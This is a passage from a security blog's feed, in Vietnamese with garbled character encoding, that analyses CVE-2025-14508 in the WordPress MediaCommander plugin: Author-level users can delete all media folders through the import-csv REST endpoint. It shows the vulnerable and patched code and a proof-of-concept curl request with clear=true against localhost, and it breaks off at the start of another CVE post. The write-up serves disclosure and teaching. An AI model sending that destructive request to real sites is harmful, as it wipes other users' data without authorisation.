&lt;strong&gt;k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c&lt;/strong&gt;, v·ªõi quy·ªÅn &lt;strong&gt;Author tr·ªü l√™n&lt;/strong&gt;, c√≥ th·ªÉ &lt;strong&gt;x√≥a to√†n b·ªô d·ªØ li·ªáu t·ªï ch·ª©c th∆∞ m·ª•c&lt;/strong&gt; do &lt;strong&gt;Administrator&lt;/strong&gt; v√† &lt;strong&gt;ng∆∞·ªùi d√πng kh√°c&lt;/strong&gt; t·∫°o ra.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-14508&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-14508&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mediacommander/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MediaCommander ‚Äì Bring Folders to Media, Posts, and Pages Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;MediaCommander ‚Äì Bring Folders to Media, Posts, and Pages&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.3.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω &lt;strong&gt;REST API&lt;/strong&gt; endpoint &lt;code&gt;/import-csv&lt;/code&gt; v·ªõi ph∆∞∆°ng th·ª©c POST nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    MEDIACOMMANDER_PLUGIN_REST_URL, // mediacommander/v1&#xA;    &amp;#39;/import-csv&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39; =&amp;gt; \WP_REST_Server::CREATABLE, // POST&#xA;        &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;importCSV&amp;#39; ],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;canUploadFiles&amp;#39; ]&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;permission_callback&lt;/code&gt; l√† &lt;code&gt;canUploadFiles&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra quy·ªÅn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function canUploadFiles() {&#xA;    return current_user_can( &amp;#39;upload_files&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Quy·ªÅn &lt;code&gt;upload_files&lt;/code&gt; d√†nh cho ng∆∞·ªùi d√πng t·ª´ Author tr·ªü l√™n.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu ng∆∞·ªùi d√πng kh√¥ng c√≥ quy·ªÅn, REST API tr·∫£ v·ªÅ l·ªói 403.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;N·∫øu c√≥ quy·ªÅn, callback &lt;code&gt;importCSV&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function importCSV( \WP_REST_Request $request ) {&#xA;    $params  = $request-&amp;gt;get_file_params();&#xA;    $file = $params[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;];&#xA;    $clear  = filter_var( $request-&amp;gt;get_param( &amp;#39;clear&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;    $attachments  = filter_var( $request-&amp;gt;get_param( &amp;#39;attachments&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;&#xA;    $data = FoldersModel::importCSV( $file, $clear, $attachments );&#xA;    $response = isset( $data ) ? [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; $data ] : [ &amp;#39;success&amp;#39; =&amp;gt; false ];&#xA;&#xA;    return new \WP_REST_Response( $response );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;importCSV&lt;/code&gt; th·ª±c hi·ªán:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y file CSV t·ª´ request.&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y c√°c tham s·ªë &lt;code&gt;clear&lt;/code&gt; v√† &lt;code&gt;attachments&lt;/code&gt;, chuy·ªÉn v·ªÅ boolean.&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;FoldersModel::importCSV&lt;/code&gt; ƒë·ªÉ x·ª≠ l√Ω d·ªØ li·ªáu CSV.&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ JSON g·ªìm &lt;code&gt;success&lt;/code&gt; v√† &lt;code&gt;data&lt;/code&gt; (n·∫øu c√≥) ho·∫∑c &lt;code&gt;success: false&lt;/code&gt; khi l·ªói.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;C·∫£nh b√°o&lt;/p&gt;&lt;p&gt;Tham s·ªë &lt;code&gt;clear&lt;/code&gt; s·∫Ω x√≥a to√†n b·ªô c√°c folder c≈© n·∫øu ƒë∆∞·ª£c ƒë·∫∑t l√† &lt;code&gt;true&lt;/code&gt;.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/clear.png&#34; title=&#34;Tham s·ªë clear&#34; data-thumbnail=&#34;/posts/2025-12-15-cve-2025-14508/clear.png&#34; data-sub-html=&#34;&lt;h2&gt;clear&lt;/h2&gt;&lt;p&gt;Tham s·ªë clear&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-15-cve-2025-14508/clear.png&#39; alt=&#34;clear&#34; height=&#34;209&#34; width=&#34;1091&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tham s·ªë clear&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v2.4.0)&lt;/strong&gt; kh·∫Øc ph·ª•c l·ªó h·ªïng b·∫±ng c√°ch thay ƒë·ªëi logic ki·ªÉm tra quy·ªÅn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    MEDIACOMMANDER_PLUGIN_REST_URL,&#xA;    &amp;#39;/import-csv&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39; =&amp;gt; \WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;importCSV&amp;#39; ],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;canManageOptions&amp;#39; ]&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;permission_callback&lt;/code&gt; l√† &lt;code&gt;canManageOptions&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function canManageOptions() {&#xA;    return current_user_can( &amp;#39;manage_options&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Quy·ªÅn &lt;code&gt;manage_options&lt;/code&gt; d√†nh cho ng∆∞·ªùi d√πng t·ª´ Administrator tr·ªü l√™n.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Authenticated user (Author&amp;#43;)&amp;#34;] --&amp;gt; B[&amp;#34;POST /wp-json/mediacommander/v1/import-csv&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;permission_callback: canUploadFiles()&amp;#34;]&#xA;C --&amp;gt; D{&amp;#34;Has upload_files capability?&amp;#34;}&#xA;D -- Yes --&amp;gt; E[&amp;#34;importCSV() executes&amp;#34;]&#xA;D -- No --&amp;gt; Z[&amp;#34;403 Forbidden&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Read CSV file and parameters (clear, attachments)&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;clear == true?&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;Delete all existing folders&amp;#34;]&#xA;H --&amp;gt; K[&amp;#34;Broken Access Control: destructive action allowed for Author&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login b·∫±ng Author account&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y &lt;code&gt;nonce&lt;/code&gt; t·ª´ response tr·∫£ v·ªÅ:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/nonce.png&#34; title=&#34;Nonce trong response&#34; data-thumbnail=&#34;/posts/2025-12-15-cve-2025-14508/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce trong response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-15-cve-2025-14508/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;310&#34; width=&#34;926&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce trong response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request v·ªõi header &lt;code&gt;X-WP-Nonce&lt;/code&gt; l√† gi√° tr·ªã &lt;code&gt;nonce&lt;/code&gt; l·∫•y ƒë∆∞·ª£c t·ª´ response:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost/wp-json/mediacommander/v1/import-csv&amp;#34; \&#xA;  -H &amp;#34;Cookie: Author cookie&amp;#34; \&#xA;  -H &amp;#34;X-WP-Nonce: 7323b67e07&amp;#34; \&#xA;  -F &amp;#34;file=@./file.csv&amp;#34; \&#xA;  -F &amp;#34;clear=true&amp;#34; \&#xA;  -F &amp;#34;attachments=false&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng CVE-2025-14508 cho th·∫•y plugin &lt;strong&gt;MediaCommander ‚â§ 2.3.1&lt;/strong&gt; cho ph√©p ng∆∞·ªùi d√πng &lt;strong&gt;Author tr·ªü l√™n&lt;/strong&gt; th·ª±c hi·ªán thao t√°c &lt;strong&gt;x√≥a to√†n b·ªô folder&lt;/strong&gt; c·ªßa ng∆∞·ªùi kh√°c th√¥ng qua REST API &lt;code&gt;import-csv&lt;/code&gt;. Nguy√™n nh√¢n l√† &lt;strong&gt;thi·∫øu ki·ªÉm tra quy·ªÅn ph√π h·ª£p&lt;/strong&gt; cho h√†nh ƒë·ªông ph√° h·ªßy d·ªØ li·ªáu. B·∫£n v√° &lt;strong&gt;2.4.0&lt;/strong&gt; ƒë√£ s·ª≠a b·∫±ng c√°ch n√¢ng quy·ªÅn ki·ªÉm tra l√™n &lt;strong&gt;Administrator&lt;/strong&gt; (&lt;code&gt;manage_options&lt;/code&gt;), ngƒÉn ch·∫∑n vi·ªác x√≥a tr√°i ph√©p.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n ph√¢n quy·ªÅn ch√≠nh x√°c theo m·ª©c ƒë·ªô r·ªßi ro c·ªßa h√†nh ƒë·ªông (destructive actions ch·ªâ d√†nh cho Administrator).&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra capability trong REST API ph·∫£i ph√π h·ª£p v·ªõi t√≠nh ch·∫•t thao t√°c, kh√¥ng ch·ªâ d·ª±a v√†o quy·ªÅn c∆° b·∫£n nh∆∞ &lt;code&gt;upload_files&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tham s·ªë nh∆∞ &lt;code&gt;clear&lt;/code&gt; c√≥ th·ªÉ g√¢y &lt;strong&gt;m·∫•t d·ªØ li·ªáu to√†n b·ªô&lt;/strong&gt;, c·∫ßn x·ª≠ l√Ω c·∫©n tr·ªçng v√† k·∫øt h·ª£p ki·ªÉm tra quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng nonce v√† cookie ƒë√∫ng c√°ch nh∆∞ng kh√¥ng th·ªÉ b√π ƒë·∫Øp cho &lt;strong&gt;broken access control&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mediacommander/vulnerability/wordpress-mediacommander-plugin-2-3-1-missing-authorization-to-authenticated-author-media-folder-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MediaCommander ‚Äì Bring Folders to Media, Posts, and Pages Plugin &amp;lt;= 2.3.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12349 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-14-cve-2025-12349/</link>
      <pubDate>Sun, 14 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-14-cve-2025-12349/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-14-cve-2025-12349/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Icegram Express ‚Äì Email Subscribers, Newsletters and Marketing Automation&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; b·ªã &lt;strong&gt;l·ªó h·ªïng Authorization&lt;/strong&gt; trong c√°c phi√™n b·∫£n &lt;strong&gt;t·ª´ tr∆∞·ªõc ƒë·∫øn v√† bao g·ªìm 5.9.10&lt;/strong&gt;. Nguy√™n nh√¢n l√† do plugin &lt;strong&gt;kh√¥ng x√°c th·ª±c ƒë√∫ng quy·ªÅn c·ªßa ng∆∞·ªùi d√πng&lt;/strong&gt; khi th·ª±c hi·ªán h√†nh ƒë·ªông trong h√†m &lt;strong&gt;&lt;code&gt;trigger_mailing_queue_sending&lt;/code&gt;&lt;/strong&gt;.&#xA;ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c (unauthenticated attackers)&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;√©p h·ªá th·ªëng g·ª≠i email ngay l·∫≠p t·ª©c&lt;/strong&gt;, &lt;strong&gt;b·ªè qua l·ªãch g·ª≠i (schedule)&lt;/strong&gt;, &lt;strong&gt;tƒÉng t·∫£i m√°y ch·ªß&lt;/strong&gt;, v√† &lt;strong&gt;thay ƒë·ªïi tr·∫°ng th√°i c·ªßa plugin&lt;/strong&gt; (v√≠ d·ª•: 